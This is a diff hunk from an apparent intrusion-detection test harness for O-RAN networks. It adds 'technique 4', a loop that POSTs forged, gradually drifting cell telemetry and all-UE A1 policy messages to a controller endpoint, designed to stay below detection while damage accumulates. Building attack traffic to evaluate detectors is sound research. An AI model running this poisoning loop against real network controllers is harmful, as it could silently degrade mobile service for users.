@@ -150,3 +150,53 @@ def tecnica3_data_camouflage():
 # ============================================================
 # TECNICA 4: TIME DRIFTING (xApp + rApp)
 # ============================================================
+def tecnica4_time_drifting():
+    """Alteracao gradual - imperceptivel passo a passo, dano cumulativo"""
+    time.sleep(12)
+    drift = 0.0
+    direcao = 1
+    while True:
+        try:
+            drift += direcao * random.uniform(0.3, 0.8)
+            if drift > 150:
+                direcao = -1
+            elif drift < -50:
+                direcao = 1
+
+            # Alterna entre xApps e rApps
+            if random.random() < 0.5:
+                # Payload xApp
+                ataque = {
+                    "id": "drift-xapp",
+                    "latency_ms": round(REF_LAT_MEAN + drift * 0.05, 2),
+                    "type": "benchmark",
+                    "cell_load_mbps": round(REF_LOAD_MEAN + drift * 0.5, 1),
+                    "cell_capacity_mbps": 100,
+                    "connected_users": max(1, int(REF_USERS_MEAN - drift * 0.2)),
+                    "status": "overload" if drift > 40 else "normal",
+                    "drift_amount": round(drift, 1)
+                }
+            else:
+                # Payload rApp
+                ataque = {
+                    "type": "A1_POLICY",
+                    "scope": "UE_GROUP_ALL",
+                    "value": random.choice([True, False]),
+                    "reason": "DYNAMIC_ENERGY_ADAPTATION",
+                    "drift_compensation": round(drift * 0.01, 4),
+                    "priority": "low"
+                }
+
+            data = json.dumps(ataque).encode()
+            req = urllib.request.Request(BASE_URL, data=data, method="POST")
+            req.add_header('Content-Type', 'application/json')
+            with urllib.request.urlopen(req, timeout=2): 
+                pass
+            time.sleep(1.0)
+        except Exception as e:
+            print(f"[IDS-T4:Drift] Erro: {e}")
+            time.sleep(2)
+
+# ============================================================
+# TECNICA 5: HYPOGLYPH INJECTION (rApp)
+# ============================================================
